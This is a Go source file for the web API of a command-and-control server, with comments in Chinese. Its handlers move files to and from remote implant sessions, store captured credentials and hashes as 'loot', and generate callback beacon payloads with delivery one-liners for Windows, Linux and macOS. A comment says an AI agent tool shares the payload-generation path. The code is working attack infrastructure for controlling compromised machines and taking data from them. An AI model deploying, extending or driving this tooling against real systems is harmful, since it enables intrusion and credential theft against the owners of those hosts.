	if err := s.m.PG().UpdateC2Transfer(transferID, "queued", 0, -1, blobPath, ""); err != nil {
		log.Printf("[c2-center] 传输 #%d 记录 blob 路径失败: %v", transferID, err)
	}
	s.c2NotifySession(id)
	log.Printf("[c2-center] 上传传输 #%d 已排队(会话 #%d → %s,%d 字节)", transferID, id, remotePath, header.Size)
	writeJSON(w, 200, map[string]any{"transfer_id": transferID})
}

// c2FilesDownload POST /api/c2/sessions/{id}/files/download — {remote_path}:
// 建 transfer + download 任务(beacon 推远端分片),→ {transfer_id}。
// 产物由 c2center 落 <BaseDir>/c2/downloads/,取回走 /api/c2/transfers/{id}/download。
func (s *Server) c2FilesDownload(w http.ResponseWriter, r *http.Request) {
	if !s.c2Ready(w) {
		return
	}
	id, ok := c2PathID(w, r)
	if !ok {
		return
	}
	if s.c2GetSessionOr404(w, id) == nil {
		return
	}
	var req struct {
		RemotePath string `json:"remote_path"`
	}
	if err := json.NewDecoder(http.MaxBytesReader(w, r.Body, 1<<20)).Decode(&req); err != nil {
		writeErr(w, 400, "invalid JSON: "+err.Error())
		return
	}
	if strings.TrimSpace(req.RemotePath) == "" {
		writeErr(w, 400, "remote_path 必填")
		return
	}
	transferID, err := s.m.PG().CreateC2Transfer(pgdb.C2TransferInput{
		SessionID: id, Direction: pgdb.C2TransferDown, RemotePath: req.RemotePath,
	})
	if err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	taskID, err := s.m.PG().CreateC2Task(pgdb.C2TaskInput{
		SessionID: id, Kind: pgdb.C2TaskKindDownload,
		Input: c2TransferTaskInput(transferID, req.RemotePath), Actor: pgdb.C2TaskActorUser,
	})
	if err != nil {
		_ = s.m.PG().UpdateC2Transfer(transferID, "error", 0, -1, "", err.Error())
		writeErr(w, 400, err.Error())
		return
	}
	if err := s.m.PG().SetC2TransferTask(transferID, taskID); err != nil {
		log.Printf("[c2-center] 传输 #%d 回填任务失败: %v", transferID, err)
	}
	s.c2NotifySession(id)
	writeJSON(w, 200, map[string]any{"transfer_id": transferID})
}

// c2TransferDownload GET /api/c2/transfers/{id}/download — 平台取回下载产物:
// 数字 id 定位 → 库内 local_path → 包含关系校验(防穿越,仿 report_export_api.go)
// → attachment 下载,文件名 = 传输 id + 远端 basename(清洗)。
func (s *Server) c2TransferDownload(w http.ResponseWriter, r *http.Request) {
	if !s.c2Ready(w) {
		return
	}
	id, ok := c2PathID(w, r)
	if !ok {
		return
	}
	tr, err := s.m.PG().GetC2Transfer(id)
	if err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	if tr == nil {
		writeErr(w, 404, "传输记录不存在")
		return
	}
	if tr.Status != "done" {
		writeErr(w, 409, "传输尚未完成,暂无产物可下载")
		return
	}
	base := ""
	if s.m != nil {
		base = s.m.dir
	}
	if tr.LocalPath == "" || !c2PathUnder(tr.LocalPath, c2BlobDir(base, "downloads")) {
		writeErr(w, 404, "产物文件不存在")
		return
	}
	data, err := os.ReadFile(tr.LocalPath)
	if err != nil {
		writeErr(w, 404, "产物文件不存在或已被清理")
		return
	}
	name := fmt.Sprintf("c2-transfer-%d-%s", tr.ID, sanitizeReportFilename(filepath.Base(tr.RemotePath)))
	w.Header().Set("Content-Type", "application/octet-stream")
	w.Header().Set("Content-Disposition", fmt.Sprintf("attachment; filename*=UTF-8''%s", urlPathEscape(name)))
	_, _ = w.Write(data)
}

// ---- 战利品 ----

// listC2Loot GET /api/c2/loot?kind=&session_id=&q=&limit=&offset= —
// 列表 content 恒空串(db 层 SQL 直接置空)+ has_content 标记;
// counts 附各 kind 总库计数(页签角标,前端可免 6 个 limit=1 请求)。
func (s *Server) listC2Loot(w http.ResponseWriter, r *http.Request) {
	if !s.c2Ready(w) {
		return
	}
	q := r.URL.Query()
	sessionID, _ := strconv.ParseInt(q.Get("session_id"), 10, 64)
	items, total, err := s.m.PG().ListC2Loot(pgdb.C2LootFilter{
		Kind:      strings.TrimSpace(q.Get("kind")),
		SessionID: sessionID,
		Q:         strings.TrimSpace(q.Get("q")),
		Limit:     atoiDefault(q.Get("limit"), 0),
		Offset:    atoiDefault(q.Get("offset"), 0),
	})
	if err != nil {
		writeErr(w, 400, err.Error())
		return
	}
	counts, err := s.m.PG().CountC2LootByKind()
	if err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	writeJSON(w, 200, map[string]any{"loot": nonNilPtrSlice(items), "total": total, "counts": counts})
}

// c2LootPayload 是记战利品的请求体。
type c2LootPayload struct {
	SessionID  int64  `json:"session_id"`
	Kind       string `json:"kind"`
	Name       string `json:"name"`
	Content    string `json:"content"`
	SourcePath string `json:"source_path"`
}

// createC2Loot POST /api/c2/loot — credential/hash 的 content 自动 secretbox 加密。
func (s *Server) createC2Loot(w http.ResponseWriter, r *http.Request) {
	if !s.c2Ready(w) {
		return
	}
	var p c2LootPayload
	if err := json.NewDecoder(http.MaxBytesReader(w, r.Body, 1<<20)).Decode(&p); err != nil {
		writeErr(w, 400, "invalid JSON: "+err.Error())
		return
	}
	if p.SessionID <= 0 {
		writeErr(w, 400, "session_id 必填")
		return
	}
	if !pgdb.ValidC2LootKind(p.Kind) {
		writeErr(w, 400, "无效战利品类型: "+p.Kind)
		return
	}
	if s.c2GetSessionOr404(w, p.SessionID) == nil {
		return
	}
	content := p.Content
	if content != "" && pgdb.LootContentEncrypted(p.Kind) {
		sealed, err := s.sealC2Secret([]byte(content))
		if err != nil {
			writeErr(w, 500, err.Error())
			return
		}
		// secretbox 密文是任意二进制,string() 直塞 TEXT 列会被 Postgres 以 invalid
		// UTF8 拒收(2026-09-26 冒烟实测 22021);base64 后落库,读取端对称解。
		content = base64.StdEncoding.EncodeToString(sealed)
	}
	id, err := s.m.PG().CreateC2Loot(pgdb.C2LootInput{
		SessionID: p.SessionID, Kind: p.Kind, Name: p.Name,
		Content: content, SourcePath: p.SourcePath,
	})
	if err != nil {
		writeErr(w, 400, err.Error())
		return
	}
	writeJSON(w, 200, map[string]any{"id": id})
}

// getC2Loot GET /api/c2/loot/{id} — 明文只在此接口解出(credential/hash 走 secretbox;
// 其余类型原文直出)。列表接口永不解密。
func (s *Server) getC2Loot(w http.ResponseWriter, r *http.Request) {
	if !s.c2Ready(w) {
		return
	}
	id, ok := c2PathID(w, r)
	if !ok {
		return
	}
	lo, err := s.m.PG().GetC2Loot(id)
	if err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	if lo == nil {
		writeErr(w, 404, "战利品不存在")
		return
	}
	if lo.Content != "" && pgdb.LootContentEncrypted(lo.Kind) {
		// 写入端把密文 base64 后落库(见 createC2Loot),这里对称解。
		sealed, err := base64.StdEncoding.DecodeString(lo.Content)
		if err != nil {
			writeErr(w, 500, "战利品密文不是合法 base64: "+err.Error())
			return
		}
		plain, err := s.openC2Secret(sealed)
		if err != nil {
			writeErr(w, 500, "解密战利品内容失败: "+err.Error())
			return
		}
		lo.Content = string(plain)
	}
	writeJSON(w, 200, lo)
}

// deleteC2Loot DELETE /api/c2/loot/{id}
func (s *Server) deleteC2Loot(w http.ResponseWriter, r *http.Request) {
	if !s.c2Ready(w) {
		return
	}
	id, ok := c2PathID(w, r)
	if !ok {
		return
	}
	deleted, err := s.m.PG().DeleteC2Loot(id)
	if err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	writeJSON(w, 200, map[string]any{"deleted": deleted})
}

// ---- 载荷 ----

// listC2Payloads GET /api/c2/payloads?listener_id=
func (s *Server) listC2Payloads(w http.ResponseWriter, r *http.Request) {
	if !s.c2Ready(w) {
		return
	}
	listenerID, _ := strconv.ParseInt(r.URL.Query().Get("listener_id"), 10, 64)
	items, err := s.m.PG().ListC2Payloads(listenerID)
	if err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	writeJSON(w, 200, map[string]any{"payloads": nonNilPtrSlice(items), "total": len(items)})
}

// createC2Payload POST /api/c2/payloads — {listener_id,format,target,name} → 201 {id,oneliner}。
// callback 为空 → 400(先填回调地址;载荷内容内嵌 callback,没它就是废纸)。
func (s *Server) createC2Payload(w http.ResponseWriter, r *http.Request) {
	if !s.c2Ready(w) {
		return
	}
	var req struct {
		ListenerID int64  `json:"listener_id"`
		Format     string `json:"format"`
		Target     string `json:"target"`
		Name       string `json:"name"`
	}
	if err := json.NewDecoder(http.MaxBytesReader(w, r.Body, 1<<20)).Decode(&req); err != nil {
		writeErr(w, 400, "invalid JSON: "+err.Error())
		return
	}
	if req.ListenerID <= 0 {
		writeErr(w, 400, "listener_id 必填")
		return
	}
	pl, _, err := s.c2GeneratePayload(req.ListenerID, req.Format, req.Target, req.Name, "user")
	if err != nil {
		writeErr(w, 400, err.Error())
		return
	}
	log.Printf("[c2-center] 载荷 «%s»(#%d) 已生成(%s/%s)", pl.Name, pl.ID, pl.Format, pl.Target)
	writeJSON(w, 201, map[string]any{"id": pl.ID, "oneliner": pl.Oneliner})
}

// c2GeneratePayload 载荷生成共用核心(API 与 agent 工具同走一条路):
// 校验 callback 非空 → 解封 key → RenderPayload 渲染字节 → 按 token 算 oneliner →
// 登记拿 id → 落盘 <BaseDir>/c2/payloads/<id><ext> → 回填路径。
// 返回载荷行与投递 URL(<callback>/<url_path>/p/<token>)。
func (s *Server) c2GeneratePayload(listenerID int64, format, target, name, createdBy string) (*pgdb.C2Payload, string, error) {
	pg := s.m.PG()
	l, err := pg.GetC2Listener(listenerID)
	if err != nil {
		return nil, "", err
	}
	if l == nil {
		return nil, "", fmt.Errorf("监听器 #%d 不存在", listenerID)
	}
	callback := strings.TrimRight(strings.TrimSpace(l.Callback), "/")
	if callback == "" {
		return nil, "", fmt.Errorf("监听器 «%s» 未配置回调地址(callback),请先填写再生成载荷", l.Name)
	}
	if strings.TrimSpace(l.URLPath) == "" {
		return nil, "", fmt.Errorf("监听器 «%s» 缺少信道路径(url_path),请编辑补齐后重试", l.Name)
	}
	if format == "" {
		format = pgdb.C2PayloadFormatPs1
	}
	if !pgdb.ValidC2PayloadFormat(format) {
		return nil, "", fmt.Errorf("无效载荷格式: %q(仅 ps1/bash/py/gosrc)", format)
	}
	if target == "" {
		target = "windows"
	}
	if !pgdb.ValidC2PayloadTarget(target) {
		return nil, "", fmt.Errorf("无效目标平台: %q(仅 windows/linux/macos/cross)", target)
	}
	// 解封 32B key(明文只在内存短暂存在)。
	sealed, err := pg.GetC2ListenerKey(listenerID)
	if err != nil {
		return nil, "", err
	}
	key, err := s.openC2Secret(sealed)
	if err != nil {
		return nil, "", fmt.Errorf("解封监听器密钥失败: %w", err)
	}
	// 渲染载荷字节(RenderPayload:返回 <listenerID>.ps1 风格文件名、脚本字节、
	// 带占位 token 的一行命令;oneliner/deliver_url 用 c2center.Oneliner/
	// DeliveryURL 注入真实 token,口径与 beacon 端一致)。
	l2 := c2centerListenerFromDB(l)
	filename, data, _, err := c2center.RenderPayload(format, target, l2, key)
	if err != nil {
		return nil, "", fmt.Errorf("渲染载荷失败: %w", err)
	}
	token := c2RandomHex(16) // 32 hex 字符投递令牌
	oneliner := c2center.Oneliner(format, l2, token)
	deliverURL := c2center.DeliveryURL(l2, token)
	sum := sha256Hex(data)
	if strings.TrimSpace(name) == "" {
		name = fmt.Sprintf("%s-%s-%s", l.Name, format, target)
	}
	if strings.TrimSpace(filename) == "" {
		filename = fmt.Sprintf("beacon_%d%s", l.ID, c2PayloadExt(format))
	}
	id, err := pg.CreateC2Payload(pgdb.C2PayloadInput{
		ListenerID: listenerID, Name: name, Format: format, Target: target,
		Token: token, SHA256: sum, Size: int64(len(data)), Oneliner: oneliner, CreatedBy: createdBy,
	})
	if err != nil {
		return nil, "", err
	}
	// 落盘(文件名带数字 id 前缀 <id>_<filename>,防猜防碰撞;失败则回滚登记行)。
	path := filepath.Join(c2BlobDir(s.m.dir, "payloads"),
		fmt.Sprintf("%d_%s", id, sanitizeReportFilename(filename)))
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		_, _ = pg.DeleteC2Payload(id)
		return nil, "", fmt.Errorf("建载荷目录失败: %w", err)
	}
	if err := os.WriteFile(path, data, 0o600); err != nil {
		_, _ = pg.DeleteC2Payload(id)
		return nil, "", fmt.Errorf("写载荷文件失败: %w", err)
	}
	if err := pg.UpdateC2PayloadFilePath(id, path); err != nil {
		return nil, "", err
	}
	pl, err := pg.GetC2Payload(id)
	if err != nil {
		return nil, "", err
	}
	return pl, deliverURL, nil
}

// deleteC2Payload DELETE /api/c2/payloads/{id} — 顺带清理落盘文件(尽力而为)。
func (s *Server) deleteC2Payload(w http.ResponseWriter, r *http.Request) {
	if !s.c2Ready(w) {
		return
	}
	id, ok := c2PathID(w, r)
	if !ok {
		return
	}
	pl, err := s.m.PG().GetC2Payload(id)
	if err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	if pl == nil {
		writeErr(w, 404, "载荷不存在")
		return
	}
	deleted, err := s.m.PG().DeleteC2Payload(id)
	if err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	base := ""
	if s.m != nil {
		base = s.m.dir
	}
	if pl.FilePath != "" && c2PathUnder(pl.FilePath, c2BlobDir(base, "payloads")) {
		if err := os.Remove(pl.FilePath); err != nil && !os.IsNotExist(err) {
			log.Printf("[c2-center] 载荷 #%d 文件清理失败: %v", id, err)
		}
	}
	writeJSON(w, 200, map[string]any{"deleted": deleted})
}

// c2PayloadDownload GET /api/c2/payloads/{id}/download — 鉴权下载(requireAuth
// 统一挂载);Content-Disposition 带清洗后的文件名。
func (s *Server) c2PayloadDownload(w http.ResponseWriter, r *http.Request) {
	if !s.c2Ready(w) {
		return
	}
	id, ok := c2PathID(w, r)
	if !ok {
		return
	}
	pl, err := s.m.PG().GetC2Payload(id)
	if err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	if pl == nil {
		writeErr(w, 404, "载荷不存在")
		return
	}
	base := ""
	if s.m != nil {
		base = s.m.dir
	}
	if pl.FilePath == "" || !c2PathUnder(pl.FilePath, c2BlobDir(base, "payloads")) {
		writeErr(w, 404, "载荷文件不存在")
		return
	}
	data, err := os.ReadFile(pl.FilePath)
	if err != nil {
		writeErr(w, 404, "载荷文件不存在或已被清理")
		return
	}
	name := sanitizeReportFilename(strings.TrimSpace(pl.Name))
	if name == "" {
		name = fmt.Sprintf("c2-payload-%d", pl.ID)
	}
	name += c2PayloadExt(pl.Format)
	w.Header().Set("Content-Type", "application/octet-stream")
	w.Header().Set("Content-Disposition", fmt.Sprintf("attachment; filename*=UTF-8''%s", urlPathEscape(name)))
	_, _ = w.Write(data)
}
